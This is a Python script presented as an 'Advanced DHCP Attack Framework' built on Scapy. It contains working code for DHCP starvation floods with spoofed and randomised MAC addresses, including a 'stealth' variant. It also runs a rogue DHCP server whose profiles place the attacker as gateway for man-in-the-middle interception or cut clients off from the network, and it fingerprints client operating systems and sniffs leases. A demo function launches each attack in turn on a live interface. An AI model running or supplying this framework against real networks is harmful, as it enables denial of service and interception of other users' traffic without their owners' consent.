#!/usr/bin/env python3
"""
Advanced DHCP Attack Framework - Professional Grade
Fixed and Improved Version
"""

import threading
import time
import logging
import socket
import struct
import random
import ipaddress
from typing import Optional, List, Dict, Tuple, Set
from dataclasses import dataclass
from enum import Enum
import netifaces

from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf,
    RandMAC, RandIP, get_if_hwaddr, ICMP, ARP,
    Dot1Q, Packet, raw
)
from scapy.sendrecv import AsyncSniffer, srp1
from scapy.layers.inet import TCP

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dhcp_attacks.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('DHCP_Attacks')

conf.verb = 0


class DHCPAttackType(Enum):
    STARVATION = "dhcp_starvation"
    ROGUE_SERVER = "rogue_dhcp"
    DISCOVERY = "dhcp_discovery"
    SNIFFING = "dhcp_sniffing"
    FINGERPRINTING = "dhcp_fingerprinting"
    RELAY_ATTACK = "dhcp_relay"
    INFORM_ATTACK = "dhcp_inform"
    FORCE_RENEW = "dhcp_force_renew"


@dataclass
class DHCPAttackResult:
    success: bool
    packets_sent: int
    leases_acquired: int
    duration: float
    details: Dict = None
    error: Optional[str] = None

    def __post_init__(self):
        if self.details is None:
            self.details = {}


class NetworkInfo:
    """Network information helper"""

    @staticmethod
    def get_network_info(iface: str) -> Dict:
        """Get network information for interface"""
        try:
            addrs = netifaces.ifaddresses(iface)
            ipv4_info = addrs.get(netifaces.AF_INET, [{}])[0]
            ip_addr = ipv4_info.get('addr', 'Unknown')
            netmask = ipv4_info.get('netmask', '255.255.255.0')

            # Get gateway
            gateway = None
            gateways = netifaces.gateways()
            default_gateway = gateways.get('default', {})
            if netifaces.AF_INET in default_gateway:
                gateway_info = default_gateway[netifaces.AF_INET]
                if gateway_info[1] == iface:
                    gateway = gateway_info[0]

            return {
                'interface': iface,
                'ip_address': ip_addr,
                'netmask': netmask,
                'gateway': gateway,
                'mac_address': get_if_hwaddr(iface)
            }
        except Exception as e:
            logger.error(f"Error getting network info: {e}")
            return {}


class DHCPNetworkDiscovery:
    """Advanced DHCP Network Discovery - FIXED"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.discovered_servers = {}
        self.network_info = NetworkInfo.get_network_info(iface)

    def discover_dhcp_servers(self, timeout: int = 10) -> Dict:
        """Discover DHCP servers in the network - IMPROVED"""
        logger.info("Starting DHCP server discovery...")

        # Clear previous results
        self.discovered_servers.clear()

        def handle_dhcp_response(pkt):
            if DHCP in pkt:
                try:
                    msg_type = pkt[DHCP].options[0][1]
                    if msg_type in [2, 5]:  # Offer or ACK
                        server_ip = pkt[IP].src
                        server_mac = pkt[Ether].src

                        if server_ip not in self.discovered_servers:
                            self.discovered_servers[server_ip] = {
                                'mac': server_mac,
                                'first_seen': time.time(),
                                'offers_sent': 0,
                                'options': self._extract_dhcp_options(pkt),
                                'message_type': 'OFFER' if msg_type == 2 else 'ACK'
                            }
                            logger.info(f"Discovered DHCP Server: {server_ip} ({server_mac})")
                except Exception as e:
                    if self.verbose:
                        logger.error(f"Error processing DHCP response: {e}")

        # Send multiple DHCP Discovers to increase chances
        for i in range(3):
            try:
                discover_packet = (
                        Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
                        IP(src="0.0.0.0", dst="255.255.255.255") /
                        UDP(sport=68, dport=67) /
                        BOOTP(chaddr=RandMAC()) /
                        DHCP(options=[
                            ("message-type", "discover"),
                            ("hostname", f"discover-{i}"),
                            "end"
                        ])
                )

                sendp(discover_packet, iface=self.iface, verbose=False)
                time.sleep(0.5)  # Small delay between discovers

            except Exception as e:
                logger.error(f"Error sending DHCP discover: {e}")

        # Sniff for responses with better filtering
        try:
            sniff(
                iface=self.iface,
                filter="udp and (port 67 or port 68)",
                prn=handle_dhcp_response,
                timeout=timeout
            )
        except Exception as e:
            logger.error(f"Error during DHCP discovery sniffing: {e}")

        logger.info(f"Discovery completed: {len(self.discovered_servers)} DHCP servers found")
        return self.discovered_servers

    def _extract_dhcp_options(self, pkt) -> Dict:
        """Extract DHCP options from packet"""
        options = {}
        if DHCP in pkt:
            for option in pkt[DHCP].options:
                if option != 'end' and option != 'pad':
                    options[option[0]] = option[1]
        return options


class AdvancedDHCPStarvation:
    """Advanced DHCP Starvation with Multiple Techniques - FIXED THREADING"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.attack_thread = None
        self.response_thread = None
        self.stats = {
            'discover_sent': 0,
            'request_sent': 0,
            'unique_macs_used': set(),
            'leases_obtained': 0,
            'ip_allocated': set()
        }

    def start_advanced_starvation(self, technique: str = "basic",
                                  packet_rate: int = 20,
                                  duration: Optional[int] = None) -> DHCPAttackResult:
        """Start advanced DHCP starvation attack - FIXED"""
        if self.running:
            return DHCPAttackResult(False, 0, 0, 0, error="Already running")

        self.running = True
        self.stats = {'discover_sent': 0, 'request_sent': 0, 'unique_macs_used': set(),
                      'leases_obtained': 0, 'ip_allocated': set()}

        logger.info(f"Starting Advanced DHCP Starvation - Technique: {technique}")

        # Start main attack thread
        self.attack_thread = threading.Thread(
            target=self._attack_loop,
            args=(technique, packet_rate, duration)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()

        return DHCPAttackResult(True, 0, 0, 0)

    def _attack_loop(self, technique: str, packet_rate: int, duration: Optional[int]):
        """Main attack loop - FIXED THREADING"""
        start_time = time.time()

        try:
            while self.running:
                if duration and (time.time() - start_time) > duration:
                    break

                if technique == "basic":
                    self._basic_starvation()
                elif technique == "aggressive":
                    self._aggressive_starvation()
                elif technique == "stealth":
                    self._stealth_starvation()
                elif technique == "complete":
                    self._complete_starvation()

                time.sleep(1.0 / packet_rate)

        except Exception as e:
            logger.error(f"Attack loop error: {e}")

        # Don't call stop from within the thread
        self.running = False

    def _basic_starvation(self):
        """Basic DHCP Discover flooding"""
        try:
            mac = str(RandMAC())
            self.stats['unique_macs_used'].add(mac)

            discover = (
                    Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac) /
                    DHCP(options=[("message-type", "discover"), "end"])
            )

            sendp(discover, iface=self.iface, verbose=False)
            self.stats['discover_sent'] += 1

            if self.verbose and self.stats['discover_sent'] % 10 == 0:
                logger.info(f"Basic starvation - Discovers sent: {self.stats['discover_sent']}")

        except Exception as e:
            logger.error(f"Basic starvation error: {e}")

    def _aggressive_starvation(self):
        """Aggressive starvation with multiple requests"""
        try:
            for _ in range(5):  # Send multiple Discovers
                mac = str(RandMAC())
                self.stats['unique_macs_used'].add(mac)

                discover = (
                        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                        IP(src="0.0.0.0", dst="255.255.255.255") /
                        UDP(sport=68, dport=67) /
                        BOOTP(chaddr=mac) /
                        DHCP(options=[("message-type", "discover"), "end"])
                )

                sendp(discover, iface=self.iface, verbose=False)
                self.stats['discover_sent'] += 1

            if self.verbose and self.stats['discover_sent'] % 10 == 0:
                logger.info(f"Aggressive starvation - Discovers sent: {self.stats['discover_sent']}")

        except Exception as e:
            logger.error(f"Aggressive starvation error: {e}")

    def _stealth_starvation(self):
        """Stealth starvation with random delays and realistic MACs"""
        try:
            # Use more realistic MAC addresses (not completely random)
            oui_prefixes = [
                "00:0c:29",  # VMware
                "00:50:56",  # VMware
                "00:1c:42",  # Parallels
                "00:16:3e",  # Xen
                "08:00:27",  # VirtualBox
            ]

            oui = random.choice(oui_prefixes)
            nic = ":".join([f"{random.randint(0, 255):02x}" for _ in range(3)])
            mac = f"{oui}:{nic}"

            self.stats['unique_macs_used'].add(mac)

            discover = (
                    Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac) /
                    DHCP(options=[
                        ("message-type", "discover"),
                        ("hostname", f"host-{random.randint(1000, 9999)}"),
                        "end"
                    ])
            )

            sendp(discover, iface=self.iface, verbose=False)
            self.stats['discover_sent'] += 1

            if self.verbose and self.stats['discover_sent'] % 5 == 0:
                logger.info(f"Stealth starvation - Discovers sent: {self.stats['discover_sent']}")

        except Exception as e:
            logger.error(f"Stealth starvation error: {e}")

    def _complete_starvation(self):
        """Complete DHCP DORA process starvation"""
        try:
            mac = str(RandMAC())
            self.stats['unique_macs_used'].add(mac)

            # Send Discover
            discover = (
                    Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac) /
                    DHCP(options=[("message-type", "discover"), "end"])
            )

            sendp(discover, iface=self.iface, verbose=False)
            self.stats['discover_sent'] += 1

            if self.verbose and self.stats['discover_sent'] % 10 == 0:
                logger.info(f"Complete starvation - Discovers sent: {self.stats['discover_sent']}")

        except Exception as e:
            logger.error(f"Complete starvation error: {e}")

    def stop_starvation(self):
        """Stop DHCP starvation - FIXED"""
        if self.running:
            self.running = False
            # Let threads exit naturally
            time.sleep(1)
            logger.info(f"DHCP Starvation stopped. Stats: {self.stats}")


class AdvancedRogueDHCPServer:
    """Advanced Rogue DHCP Server with Multiple Attack Vectors - IMPROVED"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.sniffer = None

        # Get network info for realistic configuration
        net_info = NetworkInfo.get_network_info(iface)
        base_ip = net_info.get('ip_address', '192.168.1.100').rsplit('.', 1)[0]

        self.attack_profiles = {
            'mitm': {
                'router': f"{base_ip}.254",  # Attacker as gateway
                'dns': '8.8.8.8',
                'subnet': '255.255.255.0',
                'lease_time': 3600,
                'domain': 'attacker.local'
            },
            'isolate': {
                'router': '169.254.1.1',  # Invalid gateway
                'dns': '127.0.0.1',  # Invalid DNS
                'subnet': '255.255.0.0',
                'lease_time': 600,
                'domain': 'isolated.net'
            },
            'snoop': {
                'router': f"{base_ip}.1",  # Legitimate gateway
                'dns': '8.8.8.8',
                'subnet': '255.255.255.0',
                'lease_time': 1800,
                'domain': 'local.net'
            }
        }
        self.leased_ips = {}
        self.ip_pool = set()
        self.stats = {'offers_sent': 0, 'acks_sent': 0, 'clients_served': set()}

        # Initialize IP pool based on network
        self._init_ip_pool(base_ip)

    def _init_ip_pool(self, base_ip: str):
        """Initialize IP address pool based on network"""
        try:
            # Use the same subnet as current network
            network_addr = f"{base_ip}.0/24"
            network = ipaddress.IPv4Network(network_addr, strict=False)

            for ip in network.hosts():
                if 100 <= int(ip.packed[3]) <= 200:  # Use .100-.200 range
                    self.ip_pool.add(str(ip))

            logger.info(f"Initialized IP pool with {len(self.ip_pool)} addresses")

        except Exception as e:
            logger.error(f"Error initializing IP pool: {e}")
            # Fallback to default pool
            for i in range(100, 201):
                self.ip_pool.add(f"192.168.1.{i}")

    def start_rogue_server(self, profile: str = "mitm", duration: Optional[int] = None):
        """Start advanced rogue DHCP server"""
        if self.running:
            logger.warning("Rogue DHCP server already running")
            return

        self.running = True
        config = self.attack_profiles.get(profile, self.attack_profiles['mitm'])

        logger.info(f"Starting Advanced Rogue DHCP Server - Profile: {profile}")
        logger.info(f"Configuration: {config}")

        def handle_dhcp_packet(pkt):
            if DHCP in pkt:
                try:
                    msg_type = pkt[DHCP].options[0][1]

                    if msg_type == 1:  # Discover
                        self._send_dhcp_offer(pkt, config)
                    elif msg_type == 3:  # Request
                        self._send_dhcp_ack(pkt, config)
                    elif msg_type == 4:  # Decline
                        self._handle_dhcp_decline(pkt)
                    elif msg_type == 7:  # Release
                        self._handle_dhcp_release(pkt)
                except Exception as e:
                    if self.verbose:
                        logger.error(f"Error handling DHCP packet: {e}")

        try:
            self.sniffer = AsyncSniffer(
                iface=self.iface,
                filter="udp and (port 67 or port 68)",
                prn=handle_dhcp_packet
            )
            self.sniffer.start()

            if duration:
                def stop_timer():
                    time.sleep(duration)
                    if self.running:
                        self.stop_rogue_server()

                threading.Thread(target=stop_timer, daemon=True).start()

        except Exception as e:
            logger.error(f"Error starting rogue DHCP server: {e}")
            self.running = False

    def _send_dhcp_offer(self, pkt, config: Dict):
        """Send DHCP Offer with advanced options"""
        try:
            client_mac = pkt[Ether].src
            transaction_id = pkt[BOOTP].xid
            offered_ip = self._allocate_ip(client_mac)

            if offered_ip:
                # Build comprehensive DHCP Offer
                dhcp_offer = (
                        Ether(dst=client_mac, src=get_if_hwaddr(self.iface)) /
                        IP(src=config['router'], dst="255.255.255.255") /
                        UDP(sport=67, dport=68) /
                        BOOTP(
                            op=2,
                            yiaddr=offered_ip,
                            siaddr=config['router'],
                            chaddr=client_mac,
                            xid=transaction_id,
                            secs=0,
                            flags=0x8000  # Broadcast flag
                        ) /
                        DHCP(options=[
                            ("message-type", "offer"),
                            ("server_id", config['router']),
                            ("lease_time", config['lease_time']),
                            ("subnet_mask", config['subnet']),
                            ("router", config['router']),
                            ("domain_name_server", config['dns']),
                            ("domain_name", config['domain']),
                            ("broadcast_address", f"{config['router'].rsplit('.', 1)[0]}.255"),
                            "end"
                        ])
                )

                sendp(dhcp_offer, iface=self.iface, verbose=False)
                self.stats['offers_sent'] += 1
                self.stats['clients_served'].add(client_mac)

                if self.verbose:
                    logger.info(f"Sent DHCP Offer to {client_mac} -> {offered_ip}")

        except Exception as e:
            logger.error(f"Error sending DHCP offer: {e}")

    def _send_dhcp_ack(self, pkt, config: Dict):
        """Send DHCP ACK"""
        try:
            client_mac = pkt[Ether].src
            transaction_id = pkt[BOOTP].xid

            if client_mac in self.leased_ips:
                leased_ip = self.leased_ips[client_mac]

                dhcp_ack = (
                        Ether(dst=client_mac, src=get_if_hwaddr(self.iface)) /
                        IP(src=config['router'], dst="255.255.255.255") /
                        UDP(sport=67, dport=68) /
                        BOOTP(
                            op=2,
                            yiaddr=leased_ip,
                            siaddr=config['router'],
                            chaddr=client_mac,
                            xid=transaction_id
                        ) /
                        DHCP(options=[
                            ("message-type", "ack"),
                            ("server_id", config['router']),
                            ("lease_time", config['lease_time']),
                            ("subnet_mask", config['subnet']),
                            ("router", config['router']),
                            ("domain_name_server", config['dns']),
                            ("renewal_time", config['lease_time'] // 2),
                            ("rebinding_time", config['lease_time'] * 3 // 4),
                            "end"
                        ])
                )

                sendp(dhcp_ack, iface=self.iface, verbose=False)
                self.stats['acks_sent'] += 1

                if self.verbose:
                    logger.info(f"Sent DHCP ACK to {client_mac} -> {leased_ip}")

        except Exception as e:
            logger.error(f"Error sending DHCP ACK: {e}")

    def _allocate_ip(self, client_mac: str) -> Optional[str]:
        """Allocate IP address from pool"""
        if client_mac in self.leased_ips:
            return self.leased_ips[client_mac]

        if self.ip_pool:
            ip = self.ip_pool.pop()
            self.leased_ips[client_mac] = ip
            return ip

        logger.warning("IP pool exhausted")
        return None

    def _handle_dhcp_decline(self, pkt):
        """Handle DHCP Decline - IP conflict"""
        client_mac = pkt[Ether].src
        if client_mac in self.leased_ips:
            declined_ip = self.leased_ips[client_mac]
            self.ip_pool.discard(declined_ip)
            del self.leased_ips[client_mac]
            logger.info(f"IP {declined_ip} declined by {client_mac}")

    def _handle_dhcp_release(self, pkt):
        """Handle DHCP Release - free IP"""
        client_mac = pkt[Ether].src
        if client_mac in self.leased_ips:
            released_ip = self.leased_ips[client_mac]
            self.ip_pool.add(released_ip)
            del self.leased_ips[client_mac]
            logger.info(f"IP {released_ip} released by {client_mac}")

    def stop_rogue_server(self):
        """Stop rogue DHCP server"""
        if self.running:
            self.running = False
            if self.sniffer:
                self.sniffer.stop()
            logger.info(f"Rogue DHCP stopped. Stats: {self.stats}")


class DHCPFingerprinting:
    """DHCP Fingerprinting and OS Detection - IMPROVED"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.fingerprints = {
            'Windows': {
                'parameter_list': [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252],
                'vendor_class': 'MSFT'
            },
            'Linux': {
                'parameter_list': [1, 3, 6, 12, 15, 28, 40, 41, 42, 26],
                'vendor_class': 'dhcpcd'
            },
            'macOS': {
                'parameter_list': [1, 3, 6, 15, 119, 95, 44, 46, 47],
                'vendor_class': 'AAPL'
            },
            'Android': {
                'parameter_list': [1, 3, 6, 15, 26, 28, 51, 58, 59],
                'vendor_class': 'android-dhcp'
            }
        }
        self.detected_clients = {}

    def start_fingerprinting(self, duration: int = 60) -> Dict:
        """Start DHCP fingerprinting"""
        logger.info(f"Starting DHCP fingerprinting for {duration} seconds")

        def analyze_dhcp_request(pkt):
            if DHCP in pkt:
                try:
                    msg_type = pkt[DHCP].options[0][1]
                    if msg_type == 1:  # Discover
                        self._analyze_client_fingerprint(pkt)
                except Exception as e:
                    if self.verbose:
                        logger.error(f"Error analyzing DHCP request: {e}")

        try:
            sniffer = AsyncSniffer(
                iface=self.iface,
                filter="udp and (port 67 or port 68)",
                prn=analyze_dhcp_request,
                timeout=duration
            )
            sniffer.start()
            sniffer.join()
        except Exception as e:
            logger.error(f"Error during fingerprinting: {e}")

        logger.info(f"Fingerprinting completed: {len(self.detected_clients)} clients detected")
        return self.detected_clients

    def _analyze_client_fingerprint(self, pkt):
        """Analyze client DHCP fingerprint"""
        try:
            client_mac = pkt[Ether].src
            parameter_list = []
            vendor_class = None
            hostname = None

            # Extract DHCP options
            for option in pkt[DHCP].options:
                if option[0] == 'param_req_list':
                    parameter_list = option[1]
                elif option[0] == 'vendor_class_id':
                    vendor_class = option[1]
                elif option[0] == 'hostname':
                    hostname = option[1]

            # Match against known fingerprints
            os_type = self._match_fingerprint(parameter_list, vendor_class)

            if client_mac not in self.detected_clients:
                self.detected_clients[client_mac] = {
                    'os': os_type,
                    'hostname': hostname,
                    'vendor_class': vendor_class,
                    'parameter_list': parameter_list,
                    'first_seen': time.time(),
                    'confidence': self._calculate_confidence(parameter_list, vendor_class, os_type)
                }

                logger.info(
                    f"Detected: {client_mac} -> {os_type} (Confidence: {self.detected_clients[client_mac]['confidence']}%)")

        except Exception as e:
            logger.error(f"Fingerprint analysis error: {e}")

    def _match_fingerprint(self, parameter_list: List, vendor_class: str) -> str:
        """Match DHCP fingerprint to OS"""
        best_match = "Unknown"
        highest_score = 0

        for os_name, fingerprint in self.fingerprints.items():
            score = 0

            # Check parameter list match
            param_match = len(set(parameter_list) & set(fingerprint['parameter_list']))
            score += param_match * 2

            # Check vendor class match
            if vendor_class and fingerprint['vendor_class'] in vendor_class:
                score += 10

            if score > highest_score:
                highest_score = score
                best_match = os_name

        return best_match if highest_score > 5 else "Unknown"

    def _calculate_confidence(self, parameter_list: List, vendor_class: str, os_type: str) -> int:
        """Calculate confidence percentage for OS detection"""
        if os_type == "Unknown":
            return 0

        fingerprint = self.fingerprints[os_type]
        total_params = len(fingerprint['parameter_list'])
        matched_params = len(set(parameter_list) & set(fingerprint['parameter_list']))

        param_confidence = (matched_params / total_params) * 70
        vendor_confidence = 30 if vendor_class and fingerprint['vendor_class'] in vendor_class else 0

        return min(100, int(param_confidence + vendor_confidence))


class DHCPSnoopingAttack:
    """DHCP Snooping Attack - Monitor and Analyze DHCP Traffic"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.dhcp_leases = {}
        self.rogue_servers = set()
        self.stats = {
            'discover_count': 0,
            'offer_count': 0,
            'request_count': 0,
            'ack_count': 0
        }

    def start_snooping(self, duration: int = 60) -> Dict:
        """Start DHCP snooping"""
        logger.info(f"Starting DHCP snooping for {duration} seconds")

        def analyze_dhcp_traffic(pkt):
            if DHCP in pkt:
                self._analyze_dhcp_packet(pkt)

        try:
            sniffer = AsyncSniffer(
                iface=self.iface,
                filter="udp and (port 67 or port 68)",
                prn=analyze_dhcp_traffic,
                timeout=duration
            )
            sniffer.start()
            sniffer.join()
        except Exception as e:
            logger.error(f"Error during DHCP snooping: {e}")

        return {
            'leases': self.dhcp_leases,
            'rogue_servers': list(self.rogue_servers),
            'stats': self.stats
        }

    def _analyze_dhcp_packet(self, pkt):
        """Analyze DHCP packet"""
        try:
            if DHCP in pkt:
                msg_type = pkt[DHCP].options[0][1]
                client_mac = pkt[Ether].src
                server_ip = pkt[IP].src if IP in pkt else "Unknown"

                # Update statistics
                if msg_type == 1:
                    self.stats['discover_count'] += 1
                elif msg_type == 2:
                    self.stats['offer_count'] += 1
                    # Check for rogue servers
                    if server_ip not in ['0.0.0.0', '255.255.255.255']:
                        self.rogue_servers.add(server_ip)
                        logger.warning(f"Potential rogue DHCP server detected: {server_ip}")
                elif msg_type == 3:
                    self.stats['request_count'] += 1
                elif msg_type == 5:
                    self.stats['ack_count'] += 1
                    # Record lease
                    leased_ip = pkt[BOOTP].yiaddr
                    self.dhcp_leases[client_mac] = {
                        'ip': leased_ip,
                        'server': server_ip,
                        'lease_time': self._extract_lease_time(pkt),
                        'timestamp': time.time()
                    }

                if self.verbose and self.stats['discover_count'] % 5 == 0:
                    logger.info(f"DHCP packets analyzed: {sum(self.stats.values())}")

        except Exception as e:
            logger.error(f"DHCP snooping error: {e}")

    def _extract_lease_time(self, pkt) -> int:
        """Extract lease time from DHCP packet"""
        if DHCP in pkt:
            for option in pkt[DHCP].options:
                if option[0] == 'lease_time':
                    return option[1]
        return 0


# Improved Demo Function
def demo_advanced_dhcp_attacks(iface: str = "en0"):
    """Demonstrate advanced DHCP attacks - IMPROVED"""
    logger.info("🚀 STARTING ADVANCED DHCP ATTACKS DEMONSTRATION")

    # Display network information
    net_info = NetworkInfo.get_network_info(iface)
    logger.info(f"Network Info: {net_info}")

    try:
        # 1. Network Discovery
        logger.info("\n1. 🔍 DHCP NETWORK DISCOVERY")
        discoverer = DHCPNetworkDiscovery(iface, verbose=True)
        servers = discoverer.discover_dhcp_servers(timeout=10)
        logger.info(f"Discovered {len(servers)} DHCP servers")

        # 2. Fingerprinting
        logger.info("\n2. 📊 DHCP FINGERPRINTING")
        fingerprinter = DHCPFingerprinting(iface, verbose=True)
        clients = fingerprinter.start_fingerprinting(duration=8)
        logger.info(f"Fingerprinted {len(clients)} clients")

        # 3. Advanced Starvation
        logger.info("\n3. 💥 ADVANCED DHCP STARVATION")
        starvation = AdvancedDHCPStarvation(iface, verbose=True)
        starvation.start_advanced_starvation(technique="aggressive", duration=6)
        time.sleep(8)  # Let it run
        starvation.stop_starvation()

        # 4. Advanced Rogue Server
        logger.info("\n4. 🎭 ADVANCED ROGUE DHCP SERVER")
        rogue = AdvancedRogueDHCPServer(iface, verbose=True)
        rogue.start_rogue_server(profile="mitm", duration=6)
        time.sleep(8)
        rogue.stop_rogue_server()

        # 5. Snooping Attack
        logger.info("\n5. 👁️ DHCP SNOOPING ATTACK")
        snooper = DHCPSnoopingAttack(iface, verbose=True)
        result = snooper.start_snooping(duration=8)
        logger.info(
            f"Snooping found {len(result['leases'])} leases and {len(result['rogue_servers'])} potential rogue servers")
        logger.info(f"DHCP Statistics: {result['stats']}")

    except Exception as e:
        logger.error(f"Demo error: {e}")

    logger.info("✅ ADVANCED DHCP ATTACKS DEMONSTRATION COMPLETED")


if __name__ == "__main__":
    import sys

    iface = sys.argv[1] if len(sys.argv) > 1 else "en0"

    demo_advanced_dhcp_attacks(iface)
